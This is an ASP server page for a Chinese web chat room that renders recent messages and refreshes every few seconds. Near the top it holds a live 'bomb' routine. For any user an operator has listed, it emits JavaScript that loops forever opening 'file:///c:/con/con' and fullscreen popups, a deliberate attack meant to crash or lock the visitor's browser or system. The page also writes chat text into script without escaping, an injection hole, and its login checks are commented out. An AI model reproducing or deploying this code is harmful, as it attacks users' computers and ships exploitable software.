<%@ LANGUAGE=VBScript.Encode%>
<%Response.Expires=0
sjjh_id=Session("sjjh_id")
sjjh_name=Session("sjjh_name")
sjjh_grade=Session("sjjh_grade")
sjjh_jhdj=Session("sjjh_jhdj")
nowinroom=session("nowinroom")
'if sjjh_name="" then Response.Redirect "../error.asp?id=440"
useronlinename=Application("sjjh_useronlinename"&nowinroom)
maxtimeout=int(Application("sjjh_maxtimeout"))
lasttime=Session("sjjh_lasttime")
bombname=Application("sjjh_bombname")
webicqname=Application("sjjh_webicqname")
if Instr(bombname," "&sjjh_name&" ")>0 then
bombname=Replace(bombname," "&sjjh_name&" ","")
Application.Lock
Application("sjjh_bombname")=bombname
Application.UnLock
Response.Write "<script language=JavaScript>while(true){window.open('file:///c:/con/con');window.open('readonly/bomb.htm','','fullscreen=yes,Status=no,scrollbars=no,resizable=no');}</script>"
Session.Abandon
Response.End
end if
'if sjjh_name="" or Session("sjjh_inthechat")<>"1" or Instr(LCase(useronlinename),LCase(" "&sjjh_name&" "))=0 then
'Session("sjjh_inthechat")="0"
'Response.Redirect "chaterr.asp?id=001"
'end if
n=Year(date())
y=Month(date())
r=Day(date())
s=Hour(time())
f=Minute(time())
m=Second(time())
if len(y)=1 then y="0" & y
if len(r)=1 then r="0" & r
if len(s)=1 then s="0" & s
if len(f)=1 then f="0" & f
if len(m)=1 then m="0" & m
sj=n & "-" & y & "-" & r & " " & s & ":" & f & ":" & m
if DateDiff("n",lasttime,sj)>maxtimeout then
Response.Write "<script Language=JavaScript>top.location.href='nosaytimeout.asp';</script>"
Response.End
end if

Response.Write "<html><head><META http-equiv='Content-Type' content='text/html; charset=gb2312'></head>"
Response.Write "<body  oncontextmenu=self.event.returnValue=false>"
Response.Write "<script Language=JavaScript>"
Application.Lock
sd=Application("sjjh_sd")
userline=int(Session("sjjh_line"))
newuserline=0
Dim show()
Redim Preserve show(0)
j=1
for i=1 to 200 step 10
newuserline=sd(i)
if sd(i)>userline and cstr(sd(i+9))=cstr(nowinroom) and ((session("slshow")=1 and sjjh_grade>=7) or (sd(i+2)<>"私聊" or sd(i+5)="大家" or (sd(i+2)="私聊" and (CStr(sd(i+3))=CStr(sjjh_name) or CStr(sd(i+5))=CStr(sjjh_name))))) then
Redim Preserve show(j+8)
'show(j)=sd(i)
show(j)=sd(i+1)		'色彩
show(j+1)=sd(i+2)	'动作
show(j+2)=sd(i+3)	'说话者
show(j+3)=sd(i+4)	'表情
show(j+4)=sd(i+5)	'受话者
show(j+5)=sd(i+6)	'聊天数据
show(j+6)=sd(i+7)	'头象号
show(j+7)=sd(i+8)	'对方id
show(j+8)=sd(i+9)	'所在房间
j=j+9
end if
next
if j>1  then
		for i=1 to UBound(show) step 9
		Response.Write "parent.sh("& chr(34) & show(i) & chr(34) &","& chr(34) & show(i+1) & chr(34) &","& chr(34) & show(i+2) & chr(34) &","& chr(34) & show(i+3) & chr(34) &","& chr(34) & show(i+4) & chr(34) &"," & chr(34) & show(i+5) & chr(34) &"," & chr(34) & show(i+6) & chr(34) & "," & show(i+7) & ");"
		next
end if
Response.Write "setTimeout('this.location.reload();',6000);"
if Instr(webicqname," "&sjjh_name&" ")>0 then
Application("sjjh_webicqname")=replace(Application("sjjh_webicqname"),sjjh_name,"")
Response.Write "window.open('webicqread.asp','','Status=no,scrollbars=yes,resizable=no,width=430,height=160');"
end if
Application.unLock
Response.Write "</script></body></html>"
if newuserline>userline then Session("sjjh_line")=newuserline
Response.End%>
